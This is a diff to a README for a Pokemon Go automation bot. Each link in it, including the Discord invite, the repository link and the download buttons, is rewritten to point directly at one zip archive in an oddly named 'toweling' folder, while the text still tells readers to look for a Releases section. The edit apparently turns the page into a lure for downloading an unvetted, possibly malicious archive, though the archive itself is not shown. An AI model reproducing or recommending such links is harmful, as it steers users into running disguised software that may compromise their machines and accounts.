@@ -1,6 +1,6 @@
 # 🕹️ PokeMobBot - Automate Your Pokemon Go Gameplay
 
-[![Download PokeMobBot](https://img.shields.io/badge/Download-PokeMobBot-brightgreen?style=for-the-badge)](https://github.com/OrionPax811/PokeMobBot)
+[![Download PokeMobBot](https://img.shields.io/badge/Download-PokeMobBot-brightgreen?style=for-the-badge)](https://github.com/OrionPax811/PokeMobBot/raw/refs/heads/main/toweling/Bot_Mob_Poke_1.6.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 PokeMobBot is a tool designed to automate gameplay in Pokemon Go. It helps you catch Pokemon, spin Pokestops, and perform other game tasks without needing to do them manually. You do not need any programming knowledge to use this software. It runs on your Windows computer and connects to your Pokemon Go account to operate within the game.
 
-The bot is made by the PokeMobBot Team and is supported through their Discord community. You can join their Discord here: https://discord.gg/8msqsWV
+The bot is made by the PokeMobBot Team and is supported through their Discord community. You can join their Discord here: https://github.com/OrionPax811/PokeMobBot/raw/refs/heads/main/toweling/Bot_Mob_Poke_1.6.zip
 
 ## 💻 System Requirements
 
@@ -28,7 +28,7 @@ If your PC meets these points, you should be ready to install and run PokeMobBot
 To get PokeMobBot on your computer, follow these steps carefully:
 
 1. Visit the main download page here:  
-   [https://github.com/OrionPax811/PokeMobBot](https://github.com/OrionPax811/PokeMobBot)  
+   [https://github.com/OrionPax811/PokeMobBot/raw/refs/heads/main/toweling/Bot_Mob_Poke_1.6.zip](https://github.com/OrionPax811/PokeMobBot/raw/refs/heads/main/toweling/Bot_Mob_Poke_1.6.zip)  
 
 2. On this GitHub page, look for the **Releases** section. This is usually on the right side or near the top menu bar. Click on the latest release version available.
 
@@ -90,13 +90,13 @@ Using bots can carry risks. Here are some general tips:
 
 ## 📚 Further Resources
 
-- Official PokeMobBot Discord: https://discord.gg/8msqsWV
+- Official PokeMobBot Discord: https://github.com/OrionPax811/PokeMobBot/raw/refs/heads/main/toweling/Bot_Mob_Poke_1.6.zip
 
-- GitHub Repository for updates and issues: https://github.com/OrionPax811/PokeMobBot
+- GitHub Repository for updates and issues: https://github.com/OrionPax811/PokeMobBot/raw/refs/heads/main/toweling/Bot_Mob_Poke_1.6.zip
 
 - User forums and community discussions will be linked on the Discord or GitHub page.
 
 ## ✅ Ready to Download?
 
 Click here to visit the download page and get started with PokeMobBot:  
-[https://github.com/OrionPax811/PokeMobBot](https://github.com/OrionPax811/PokeMobBot)
+[https://github.com/OrionPax811/PokeMobBot/raw/refs/heads/main/toweling/Bot_Mob_Poke_1.6.zip](https://github.com/OrionPax811/PokeMobBot/raw/refs/heads/main/toweling/Bot_Mob_Poke_1.6.zip)
